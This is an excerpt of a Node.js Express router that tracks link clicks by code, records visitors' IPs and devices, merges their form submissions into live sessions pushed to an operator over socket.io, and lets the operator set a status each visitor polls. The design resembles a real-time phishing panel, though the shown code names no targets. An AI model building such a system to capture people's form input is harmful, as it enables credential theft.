...
router.get('/click/:code', async (req, res) => {
  try {
    ...
    const s = await Session.create({ trackingCode: req.params.code, visitorId, ip: req.ip, browser: ua.substring(0, 50), deviceType: /mobile/i.test(ua) ? 'Mobile' : 'Desktop', status: 'Active', isLive: true, entryUrl: req.params.code, currentUrl: req.params.code, lastActivity: new Date().toISOString(), clicks: 0 });
    const link = await Link.findOne({ trackingCode: req.params.code });
    if (link) await Link.findByIdAndUpdate(link._id, { total_clicks: (link.total_clicks||0)+1 });
...
router.get('/status/:visitorId', async (req, res) => {
  try {
    const all = await db.sessions.read();
    const s = all.filter(x => x.visitorId === req.params.visitorId).sort((a,b) => new Date(b.lastActivity) - new Date(a.lastActivity))[0];
    if (!s) return res.json({ adminStatus: null });
    res.json({ adminStatus: s.adminStatus || null });
  } catch (err) { res.status(500).json({ message: 'Server error' }); }
});
...
router.post('/submit', async (req, res) => {
  try {
    ...
    let all = await db.sessions.read(); let idx = all.findIndex(x => x.visitorId === visitorId);
    if (idx === -1) { const s = await Session.create({ trackingCode: 'direct', visitorId, ip: req.ip, browser: 'Unknown', deviceType: 'Desktop', status: 'Active', isLive: true, formData: formData, entryUrl: '', currentUrl: '', lastActivity: new Date().toISOString(), clicks: 0 }); const io = req.app.get('io'); if (io) { io.emit('newSession', s); io.emit('formSubmitted', { visitorId, formData }); } return res.json({ message: 'Submitted' }); }
    all[idx].formData = { ...(all[idx].formData || {}), ...formData }; all[idx].lastActivity = new Date().toISOString(); await db.sessions.write(all);
...
router.post('/heartbeat', async (req, res) => {
  try {
    ...
    const all = await db.sessions.read(); const i = all.findIndex(s => s.visitorId === visitorId);
    if(i !== -1) { all[i].isLive = status !== 'Offline'; all[i].status = status === 'Offline' ? 'Offline' : 'Active'; all[i].lastActivity = new Date().toISOString(); await db.sessions.write(all); if(status === 'Offline') { const io = req.app.get('io'); if(io) io.emit('visitorOffline', { visitorId }); } }
    res.json({ ok: true });
  } catch(err) { res.status(500).json({ message: 'Server error' }); }
});
